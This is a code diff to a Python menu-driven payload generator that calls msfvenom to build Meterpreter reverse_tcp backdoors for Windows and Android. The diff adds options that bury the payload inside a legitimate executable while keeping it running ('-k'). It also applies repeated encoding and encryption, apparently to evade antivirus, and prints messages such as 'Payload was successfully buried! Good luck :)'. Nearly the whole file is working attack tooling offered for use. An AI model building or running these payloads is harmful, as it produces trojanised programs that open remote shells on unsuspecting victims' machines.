@@ -21,22 +21,26 @@ def main():
     print(f"{Fore.GREEN}{Style.BRIGHT}                                    Created by Syntax")
 
     print()
+    print(f"{Fore.RED}{Style.BRIGHT} NOTE: The '-k' parameter is not recommended for installation files.")
     print()
     print(f"{Fore.GREEN}{Style.BRIGHT}      [1] x64 Windows payload (exe)")
     print(f"{Fore.GREEN}{Style.BRIGHT}      [2] x86 Windows payload (exe)")
     print(f"{Fore.GREEN}{Style.BRIGHT}      [3] x64 Windows payload (embed exe)")
-    print(f"{Fore.GREEN}{Style.BRIGHT}      [4] X86 Windows payload (embed exe)")
-    print(f"{Fore.GREEN}{Style.BRIGHT}      [5] Android payload (apk)")
-    print(f"{Fore.GREEN}{Style.BRIGHT}      [6] Android payload (embed apk)")
-    print(f"{Fore.GREEN}{Style.BRIGHT}\n                          [99] Exit")
+    print(f"{Fore.GREEN}{Style.BRIGHT}      [4] x86 Windows payload (embed exe)")
+    print(f"{Fore.GREEN}{Style.BRIGHT}      [5] x64 Windows payload (embed exe with '-k' parameter)")
+    print(f"{Fore.GREEN}{Style.BRIGHT}      [6] x86 Windows payload (embed exe with '-k' parameter)")
+    print(f"{Fore.GREEN}{Style.BRIGHT}      [7] Android payload (apk)")
+    print(f"{Fore.GREEN}{Style.BRIGHT}      [8] Android payload (embed apk)")
+    print(f"{Fore.RED}{Style.BRIGHT}\n                          [99] Exit")
     print()
 
     selection = input(f"{Fore.GREEN}{Style.BRIGHT} [*] selection: ")
 
     if selection == "1":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => x64 Windows payload (exe)")
         localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
-        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
-        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
         if localip and localport and filename:
             payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "cmd/powershell_base64", "-i", "30", "--encrypt", "base64", "--arch", "x64", "--platform", "windows", "-o", filename])
             if payload_code == 0:
@@ -50,9 +54,10 @@ def main():
             print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")
 
     elif selection == "2":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => x86 Windows payload (exe)")
         localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
-        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
-        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
         if localip and localport and filename:
             payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "x86/shikata_ga_nai", "-i", "30", "--encrypt", "rc4", "--arch", "x86", "--platform", "windows", "-o", filename])
             if payload_code == 0:
@@ -66,10 +71,11 @@ def main():
             print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")
 
     elif selection == "3":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => x64 Windows payload (embed exe)")
         localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
-        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
-        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT} [*] File to be embedded: ")
-        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] File to be embedded: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
         if localip and localport and filename:
             payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "cmd/powershell_base64", "-i", "30", "--encrypt", "base64", "--arch", "x64", "--platform", "windows", "-x", embedfile, "-o", filename])
             if payload_code == 0:
@@ -84,10 +90,11 @@ def main():
             print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")
 
     elif selection == "4":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => x86 Windows payload (embed exe)")
         localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
-        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
-        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT} [*] File to be embedded: ")
-        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] File to be embedded: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
         if localip and localport and filename:
             payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "x86/shikata_ga_nai", "-i", "30", "--encrypt", "rc4", "--arch", "x86", "--platform", "windows", "-x", embedfile, "-o", filename])
             if payload_code == 0:
@@ -102,9 +109,48 @@ def main():
             print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")
 
     elif selection == "5":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => x64 Windows payload (embed exe with '-k' parameter)")
         localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
-        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
-        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] File to be embedded: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
+        if localip and localport and filename:
+            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/x64/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "cmd/powershell_base64", "-i", "30", "--encrypt", "base64", "--arch", "x64", "--platform", "windows", "-x", embedfile, "-k", "-o", filename])
+            if payload_code == 0:
+                full_path = os.path.abspath(filename)
+                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload was successfully buried!")
+                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload Created Successfully! Good luck :)")
+                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
+            else:
+                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
+                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
+        else:
+            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")
+
+    elif selection == "6":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => x86 Windows payload (embed exe with '-k' parameter)")
+        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] File to be embedded: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
+        if localip and localport and filename:
+            payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "-f", "exe", "-e", "x86/shikata_ga_nai", "-i", "30", "--encrypt", "rc4", "--arch", "x86", "--platform", "windows", "-x", embedfile, "-k", "-o", filename])
+            if payload_code == 0:
+                full_path = os.path.abspath(filename)
+                print(f"{Fore.GREEN}{Style.BRIGHT}\n [+] Payload was successfully buried!")
+                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload Created Successfully! Good luck :)")
+                print(f"{Fore.GREEN}{Style.BRIGHT} [+] Payload saved at: {full_path}")
+            else:
+                print(f"{Fore.RED}{Style.BRIGHT}\n [-] Error: Payload not created!")
+                print(f"{Fore.RED}{Style.BRIGHT} [-] msfvenom output: {payload_error}")
+        else:
+            print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")
+
+    elif selection == "7":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => Android payload (apk)")
+        localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
         if localip and localport and filename:
             payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "--platform", "android", "--arch", "dalvik", "-o", filename])
             if payload_code == 0:
@@ -117,11 +163,12 @@ def main():
         else:
             print(f"{Fore.RED}{Style.BRIGHT}\n [-] Missing input for IP, port or filename!")
 
-    elif selection == "6":
+    elif selection == "8":
+        print(f"{Fore.BLUE}{Style.BRIGHT}\n  => Android payload (embed apk)")
         localip = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local IP: ")
-        localport = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Local Port: ")
-        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT} [*] File to be embedded: ")
-        filename = input(f"{Fore.GREEN}{Style.BRIGHT} [*] Payload file name: ")
+        localport = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Local Port: ")
+        embedfile = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] File to be embedded: ")
+        filename = input(f"{Fore.GREEN}{Style.BRIGHT}\n [*] Payload file name: ")
         if localip and localport and filename:
             payload_code, payload_output, payload_error = execute_command(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={localip}", f"LPORT={localport}", "--platform", "android", "--arch", "dalvik", "-x", embedfile, "-o", filename])
             if payload_code == 0:
